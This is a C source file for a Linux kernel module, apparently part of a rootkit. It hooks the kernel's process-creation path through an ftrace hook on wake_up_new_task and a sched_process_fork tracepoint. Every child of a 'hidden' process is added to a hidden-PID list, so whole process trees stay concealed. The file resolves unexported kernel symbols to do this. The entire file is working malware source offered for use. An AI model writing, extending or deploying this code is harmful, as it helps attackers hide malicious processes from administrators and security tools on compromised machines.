#include "../include/core.h"
#include "../include/trace.h"
#include "../include/hidden_pids.h"
#include "../ftrace/ftrace_helper.h"

static struct tracepoint *tp_sched_fork;
static int (*_probe_register)(struct tracepoint *, void *, void *);
static int (*_probe_unregister)(struct tracepoint *, void *, void *);

notrace static void on_fork_handler(void *data, struct task_struct *parent, struct task_struct *child)
{
    if (is_hidden_pid(parent->pid) || is_hidden_pid(parent->tgid) ||
        is_child_pid(parent->pid) || is_child_pid(parent->tgid)) {
        add_child_pid(child->pid);
        add_child_pid(child->tgid);
    }
}

static void (*orig_wake_up_new_task)(struct task_struct *p) = NULL;

static notrace void hook_wake_up_new_task(struct task_struct *p)
{
    if (!orig_wake_up_new_task) return;
    if (p) {
        pid_t ppid  = READ_ONCE(current->pid);
        pid_t ptgid = READ_ONCE(current->tgid);
        if (is_hidden_pid(ppid) || is_hidden_pid(ptgid) ||
            is_child_pid(ppid)  || is_child_pid(ptgid)) {
            add_child_pid(READ_ONCE(p->pid));
            add_child_pid(READ_ONCE(p->tgid));
        }
    }
    orig_wake_up_new_task(p);
}

static struct ftrace_hook trace_hooks[] = {
    HOOK("wake_up_new_task", hook_wake_up_new_task, &orig_wake_up_new_task),
};

notrace int trace_pid_init(void)
{
    _probe_register = (void *)resolve_sym("tracepoint_probe_register");
    _probe_unregister = (void *)resolve_sym("tracepoint_probe_unregister");
    tp_sched_fork = (void *)resolve_sym("__tracepoint_sched_process_fork");

    if (tp_sched_fork && _probe_register)
        _probe_register(tp_sched_fork, on_fork_handler, NULL);

    fh_install_hooks(trace_hooks, ARRAY_SIZE(trace_hooks));

    return 0;
}
EXPORT_SYMBOL(trace_pid_init);

notrace void trace_pid_cleanup(void)
{
    if (tp_sched_fork && _probe_unregister)
        _probe_unregister(tp_sched_fork, on_fork_handler, NULL);

    fh_remove_hooks(trace_hooks, ARRAY_SIZE(trace_hooks));
}
EXPORT_SYMBOL(trace_pid_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ByteKick");
